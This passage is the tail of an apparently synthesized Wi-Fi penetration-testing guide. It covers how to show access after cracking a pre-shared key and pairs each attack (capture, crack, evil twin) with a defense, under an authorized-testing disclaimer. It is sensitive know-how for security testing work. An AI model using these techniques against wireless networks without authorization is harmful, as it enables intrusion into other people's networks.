**Proof to screenshot:** `wlan0` with a DHCP lease on the target's subnet + a successful `ping`/`curl` to
the gateway or an internal host — *that* is "access demonstrated." Then disconnect and `fix-adapter.sh`
back to monitor, and log it. **Defense:** NAC / client isolation / segmentation limit what a recovered key
is worth (a cracked PSK on an isolated guest VLAN proves little).

---

*Authorized testing only. Every BSSID on the allowlist, every session logged, lowest TX power that
reaches the target, quietest technique that works. A strong passphrase defeats the crack; PMF/
WPA3-SAE defeats the capture; a WIDS baseline defeats the twin; the paired defense is the
deliverable. Synthesized 2026-11-14 from theme-capture-crack, theme-access-rogue,
theme-advanced-enterprise, theme-platform-method-defense (24 topic files + 4 theme syntheses behind
them). Re-verify every flag with `-h` / `man` / `help <module>` on your installed version.*
